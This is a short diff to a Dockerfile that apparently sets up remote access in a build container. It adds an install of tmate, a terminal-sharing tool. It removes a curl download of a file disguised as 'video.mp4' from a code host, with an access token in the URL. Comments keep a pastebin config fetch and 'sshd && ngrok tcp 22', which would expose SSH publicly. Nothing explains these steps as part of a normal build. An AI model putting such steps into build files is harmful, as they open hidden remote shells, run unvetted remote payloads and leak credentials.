@@ -1,9 +1,14 @@
-FROM registry-intl.cn-hongkong.aliyuncs.com/rakesh/run:nodejs
+FROM registry-intl.cn-hongkong.aliyuncs.com/rakesh/run:beta
+RUN apt update && apt install tmate
 
-#RUN curl https://pastebin.com/raw/3BLEQDdR -o dist/config.json 
-RUN echo "downloading"
-RUN curl "https://raw.codehub.cn/p/python-dev/d/lodalahasun/git/raw/master/video.mp4?token=BS3q1MkEez5bp9VRsrCKrGo4mcYfrBpo9RShLt3B1I&download=true"
+#--------
+# FROM registry-intl.cn-hongkong.aliyuncs.com/rakesh/run:nodejs
+
+# #RUN curl https://pastebin.com/raw/3BLEQDdR -o dist/config.json 
 # RUN bash run.sh
+
+
+
 # FROM registry-intl.cn-hongkong.aliyuncs.com/rakesh/run:codebuild
 # # RUN /usr/sbin/sshd && ngrok tcp 22
 # RUN echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections
